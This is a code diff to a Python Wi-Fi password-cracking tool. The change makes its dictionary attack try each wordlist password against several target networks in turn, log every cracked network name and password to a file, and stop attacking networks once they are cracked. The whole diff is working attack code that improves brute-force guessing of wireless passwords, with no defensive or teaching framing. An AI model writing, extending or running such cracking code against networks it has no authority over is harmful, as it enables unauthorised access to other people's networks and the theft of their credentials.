@@ -82,10 +82,11 @@ def crack_password(ssid, password, number, verbose=False):
         print(BOLD, GREEN, '[*] password is ' + password, RESET)
         wifi.iface.disconnect()
         time.sleep(1)
-        exit()
+        # exit()
+        return True
     else:
         print(LIGHT_RED, '[{}] Crack Failed using {}'.format(number, password))
-
+        return False
 
 # opening and reading the file
 def crack_loop(ssid, file, verbose=False):
@@ -97,27 +98,32 @@ def crack_loop(ssid, file, verbose=False):
     else:
         ssids = [ssid]
 
-    for ssid in ssids:
-        # ssid = network.ssid
-
-        number = 0
-        # with open(file, 'r', encoding='utf8') as words:
-        words = get_filehandle(file)
-        for line in words:
-            number += 1
-            # line = line.split("\n")
-            # pwd = line.strip('\r').strip('\n').strip()
-            try:
-                # url
-                pwd = line.decode('utf-8').strip().strip('\r').strip('\n')
-            except:
-                # file
-                pwd = line.strip().strip('\r').strip('\n')
-                pass
+    number = 0
+    # with open(file, 'r', encoding='utf8') as words:
+    words = get_filehandle(file)
+    for line in words:
+        number += 1
+        # line = line.split("\n")
+        # pwd = line.strip('\r').strip('\n').strip()
+        try:
+            # url
+            pwd = line.decode('utf-8').strip().strip('\r').strip('\n')
+        except:
+            # file
+            pwd = line.strip().strip('\r').strip('\n')
+            pass
+        for ssid in ssids:
+            # ssid = network.ssid
             print(YELLOW)
             print(f"[{number}] Trying {ssid} with {pwd}")
-            crack_password(ssid, pwd, number, verbose=False)
-        words.close()
+            if crack_password(ssid, pwd, number, verbose=False):
+                print(DARK_WHITE, f"saving {ssid}:{pwd} to ../data/ssid-cracked.txt")
+                with open('../data/ssid-cracked.txt', 'a') as out:
+                    out.write(f"{ssid}:{pwd}")
+                print(f"removing {ssid} from loop")
+                ssids.remove(ssid)
+
+    words.close()
 
 
 def menu():
